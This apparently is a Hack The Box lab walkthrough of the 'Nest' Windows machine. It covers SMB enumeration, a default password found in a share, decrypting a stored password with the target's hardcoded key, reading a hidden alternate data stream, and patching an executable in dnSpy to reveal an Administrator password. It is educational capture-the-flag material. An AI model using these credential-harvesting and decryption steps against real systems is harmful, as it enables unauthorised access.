---
title: Hack the box Nest walkthrough 
date: 2020-06-02 08:46:00 +0800
categories: [HackTheBox, windows]
comments: true
tags: [SMB,HackTheBox,Nest,Dnspy,.net]     # TAG names should always be lowercase
---
# overview 
![htb-Nest](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQp6n8OlbIe-xvrVv2gBLv8tpYLQuoiAIfZ-_lRWX_PX7T1wWBF&usqp=CAU)

tools used: nmap,smbclient,smbget, dot net fiddle, dnspy

# service enumeration
first, I run Nmap to find open ports, services, and service versions.
```bash
kali@kali:~/htb/nest$ Nmap -T4 -A -p- 10.10.10.178 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-27 15:43 EDT
Nmap scan report for 10.10.10.178
The host is up (0.057s latency).
Not shown: 65533 filtered ports
PORT STATE SERVICE VERSION
445/tcp open Microsoft-ds?
4386/tcp open unknown

| fingerprint-strings:
| DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
| Reporting Service V1.2
| FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions:
| Reporting Service V1.2
| Unrecognised command
| Help:
| Reporting Service V1.2
| This service allows users to run queries against databases using the legacy HQK format
| AVAILABLE COMMANDS ---
| LIST
| SETDIR <Directory_Name>
| RUNQUERY <Query_ID>
| DEBUG <Password>
|_ HELP <Command>

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
Host script results:

|_clock-skew: 3m38s
| smb2-security-mode:
| 2.02:
|_ Message signing enabled but not required
| smb2-time:
| date: 2020-05-27T19:51:29
|_ start_date: 2020-05-27T19:41:37

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap did: 1 IP address (1 host up) scanned in 301.07 seconds
kali@kali:~/htb/nest$
```
the Nmap scan tells me that there are two ports open 445/smb and 4386/HQK reporting I SMB is what I am most familiar with so I will start with that.
# SMB share enumeration 
the following command lists the shares.
```bash
kali@kali:~/htb/nest$ smbclient -L \\\\10.10.10.178
Enter WORKGROUP\kali's password:

        Sharename      Type      Comment
        ---------      ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk     
        IPC$            IPC      Remote IPC
        Secure$        Disk     
        Users          Disk     
SMB1 disabled -- no workgroup available
```
the Data share seams to be accessible anonymously.

```bash
kali@kali:~/htb/nest$ smbclient  \\\\10.10.10.178\\Data
Enter WORKGROUP\kali's password:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> ls
  .                                  D        0  Wed Aug  7 18:53:46 2019
  ..                                  D        0  Wed Aug  7 18:53:46 2019
  IT                                  D        0  Wed Aug  7 18:58:07 2019
  Production                          D        0  Mon Aug  5 17:53:38 2019
  Reports                            D        0  Mon Aug  5 17:53:44 2019
  Shared                              D        0  Wed Aug  7 15:07:51 2019

\IT
NT_STATUS_ACCESS_DENIED listing \IT\*
\Production
NT_STATUS_ACCESS_DENIED listing \Production\*
\Reports
NT_STATUS_ACCESS_DENIED listing \Reports\*
\Shared
  .                                  D        0  Wed Aug  7 15:07:51 2019
  ..                                 D        0  Wed Aug  7 15:07:51 2019
  Maintenance                        D        0  Wed Aug  7 15:07:32 2019
  Templates                          D        0  Wed Aug  7 15:08:07 2019
\Shared\Maintenance
  .                                  D        0  Wed Aug  7 15:07:32 2019
  ..                                 D        0  Wed Aug  7 15:07:32 2019
  Maintenance Alerts.txt             A       48  Mon Aug  5 19:01:44 2019
\Shared\Templates
  .                                  D        0  Wed Aug  7 15:08:07 2019
  ..                                 D        0  Wed Aug  7 15:08:07 2019
  HR                                 D        0  Wed Aug  7 15:08:01 2019
  Marketing                          D        0  Wed Aug  7 15:08:06 2019
\Shared\Templates\HR
  .                                  D        0  Wed Aug  7 15:08:01 2019
  ..                                 D        0  Wed Aug  7 15:08:01 2019
  Welcome Email.txt                  A      425  Wed Aug  7 18:55:36 2019
\Shared\Templates\Marketing
  .                                  D        0  Wed Aug  7 15:08:06 2019
  ..                                 D        0  Wed Aug  7 15:08:06 2019
smb: \>
```

the `Maintenance Alerts.txt` and `Welcome Email.txt` look interesting
you can retrieve them using the following commands. 
```bash
kali@kali:~/htb/nest$ smbclient  \\\\10.10.10.178\\Data
Enter WORKGROUP\kali's password:
Try "help" to get a list of possible commands.
smb: \> cd \Shared\Maintenance
smb: \Shared\Maintenance\> mget "Maintenance Alerts.txt"
Get file Maintenance Alerts.txt? Yes
getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Maintenance Alerts.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \Shared\Maintenance\> cd ../Templates/HR
smb: \Shared\Templates\HR\> mget "Welcome Email.txt"
Get file Welcome Email.txt? Yes
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (2.0 KiloBytes/sec) (average 1.1 KiloBytes/sec)
smb: \Shared\Templates\HR\>
```
the "Welcome Email.txt" file has smb login creds
```
kali@kali:~/htb/nest$ cat Welcome\ Email.txt
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location:
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR
```
TempUser has access to  a visual basic project at Secure$\IT\Carl you can download all of carls files using the following command
```bash
smbget -rR smb://10.10.10.178/Secure$/IT/Carl/ -U TempUser
```
you can move the project files from /Secure$/IT/Carl//VB Projects/WIP/RU/RUScanner/  to [dotnetfiddle.net](https://dotnetfiddle.net/) this lets us use the code to decrypt the encrypted password in **RU_Config.xml** the only change you need to make to the code is to add ```System.Console.WriteLine(plainText)``` before the decrypt function ends.
```vb
Imports System.Text
Imports System.Security.Cryptography
Public Class Utils
	Public Class ConfigFile
    Public Property Port As Integer
    Public Property Username As String
    Public Property Password As String

    Public Sub SaveToFile(Path As String)
						Using File As New System.IO.FileStream(Path, System.IO.FileMode.Create)
            Dim Writer As New System.Xml.Serialization.XmlSerializer(GetType(ConfigFile))
            Writer.Serialize(File, Me)
        End Using
    End Sub

    Public Shared Function LoadFromFile(ByVal FilePath As String) As ConfigFile
        Using File As New System.IO.FileStream(FilePath, System.IO.FileMode.Open)
            Dim Reader As New System.Xml.Serialization.XmlSerializer(GetType(ConfigFile))
            Return DirectCast(Reader.Deserialize(File), ConfigFile)
        End Using
    End Function
  
End Class
    Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function Decrypt(ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String
        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)
        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)
        Dim cipherTextBytes As Byte()
		cipherTextBytes = System.Convert.FromBase64String(cipherText)
        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)
        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))
        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC
        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)
				Dim memoryStream As System.IO.MemoryStream
				memoryStream = New System.IO.MemoryStream(cipherTextBytes)
        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)
        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)
        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)
        memoryStream.Close()
        cryptoStream.Close()
        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)
	System.Console.WriteLine(plainText) // add this line
	Return plainText
    End Function

Public Class SsoIntegration
    Public Property Username As String
    Public Property Password As String
End Class
    
    Sub Main()
		Dim test As New SsoIntegration With {.Username = "c.smith", .Password = Utils.DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=")}
    End Sub
End Class
```
the password can be used to login to C.smith
# smb enumeration as c smith
```
smb: \> recurse on
smb: \> ls
  .                                  D        0  Sat Jan 25 18:04:21 2020
  ..                                 D        0  Sat Jan 25 18:04:21 2020
  Administrator                      D        0  Fri Aug  9 11:08:23 2019
  C.Smith                            D        0  Sun Jan 26 02:21:44 2020
  L.Frost                            D        0  Thu Aug  8 13:03:01 2019
  R.Thompson                         D        0  Thu Aug  8 13:02:50 2019
  TempUser                           D        0  Wed Aug  7 18:55:56 2019

\Administrator
NT_STATUS_ACCESS_DENIED listing \Administrator\*

\C.Smith
  .                                  D        0  Sun Jan 26 02:21:44 2020
  ..                                 D        0  Sun Jan 26 02:21:44 2020
  HQK Reporting                      D        0  Thu Aug  8 19:06:17 2019
  user.txt                           A      32  Thu Aug  8 19:05:24 2019

\L.Frost
NT_STATUS_ACCESS_DENIED listing \L.Frost\*

\R.Thompson
NT_STATUS_ACCESS_DENIED listing \R.Thompson\*

\TempUser
NT_STATUS_ACCESS_DENIED listing \TempUser\*

\C.Smith\HQK Reporting
  .                                  D        0  Thu Aug  8 19:06:17 2019
  ..                                 D        0  Thu Aug  8 19:06:17 2019
  AD Integration Module              D        0  Fri Aug  9 08:18:42 2019
  Debug Mode Password.txt            A        0  Thu Aug  8 19:08:17 2019
  HQK_Config_Backup.xml              A      249  Thu Aug  8 19:09:05 2019

\C.Smith\HQK Reporting\AD Integration Module
  .                                  D        0  Fri Aug  9 08:18:42 2019
  ..                                 D        0  Fri Aug  9 08:18:42 2019
  HqkLdap.exe                        A    17408  Wed Aug  7 19:41:16 2019
smb: \>
```
## getting user.txt
```bash
kali@kali:~/htb/nest$ smbclient  \\\\10.10.10.178\\Users -U C.Smith
Enter WORKGROUP\C.Smith's password:
Try "help" to get a list of possible commands.
smb: \> cd C.Smith\
smb: \C.Smith\> get user.txt
getting file \C.Smith\user.txt of size 32 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \C.Smith\>
```
# privilege escalation
there's a file named Debug Mode Password the file has no data in it but if you run 
```
smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
 altname: DEBUGM-1.TXT 
 create_time:  Thu Aug 8 07:06:12 PM 2019 EDT 
 access_time:  Thu Aug 8 07:06:12 PM 2019 EDT 
 write_time:   Thu Aug 8 07:08:17 PM 2019 EDT 
 change_time:  Thu Aug 8 07:08:17 PM 2019 EDT 
 attributes: A (20)
 stream: [::$DATA], 0 bytes 
 stream: [:Password:$DATA], 15 bytes 
```
there is a password stream hear is how you read it
![get password stream](https://i.ibb.co/5vCVw2s/Untitled.png)

```bash
kali@kali:~/htb/nest$ cat Debug\ Mode\ Password.txt\:\$Data
{redacted}
```
this password can  be used to get access to debug mode debug gives you access to showquery
```
kali@kali:~/htb/nest$ telnet 10.10.10.178 4386                                                                                                                               
Trying 10.10.10.178...                                                                                                                                                                     
Connected to 10.10.10.178.                                                                                                                                                                 
Escape character is '^]'.                                                                                                                                                                 
                                                                                                                                                                                           
HQK Reporting Service V1.2                                                                                                                                                                 
                                                                                                                                                                                           
>debug WBQ201953D8w                                                                                                                                                                       
                                                                                                                                                                                           
Debug mode enabled. Use the HELP command to view additional commands that are now available                                                                                               
>list                                                                                                                                                                                     
                                                                                                                                                                                           
Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command                                                                                   
                                                                                                                                                                                           
QUERY FILES IN CURRENT DIRECTORY                                                                                                                                                         
                                                                                                                                                                                           
[DIR]  COMPARISONS
[1]  Invoices (Ordered By Customer)
[2]  Products Sold (Ordered By Customer)
[3]  Products Sold In Last 30 Days

Current Directory: ALL QUERIES
>setdir ..

Current directory set to HQK
>list 

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]  HqkSvc.exe
[2]  HqkSvc.InstallState
[3]  HQK_Config.xml

Current Directory: HQK
>setdir LDAP   

Current directory set to LDAP
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

QUERY FILES IN CURRENT DIRECTORY

[1]  HqkLdap.exe
[2]  Ldap.conf

Current Directory: LDAP
>showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=

>
```
the password in Ldap.conf is encrypted HqkLdap.exe decrypts it, you can open HqkLdap.exe in dnspy. when you open the exe file in dnspy go to the MainModule right click and edit method.
![dnspy](https://i.ibb.co/Jtn5VMn/Capture.png)
the code won't run unless hqkDBimport.exe is present the file is not needed so you can delete the check
```
try
				{
					if (MyProject.Application.CommandLineArgs.Count != 1)
					{
						Console.WriteLine("Invalid number of command line arguments");
					}
					else if (!File.Exists(MyProject.Application.CommandLineArgs[0]))
					{
						Console.WriteLine("Specified config file does not exist");
					}
					else
					{
						LdapSearchSettings ldapSearchSettings = new LdapSearchSettings();
```
and add ```Console.WriteLine(ldap.Password.ToString());``` above "Performing LDAP query" the mod is done now to export it go to file 'save all' lastly run the file in PowerShell 
```
PS C:\Users\MatthewS\OneDrive\Desktop\New folder> .\HqkLdapmod.exe .\Ldap.conf
REDACTED
```
you can use this password to login to smb and get the root flag
```bash
smbclient  \\\\10.10.10.178\\c$ -U Administrator
```



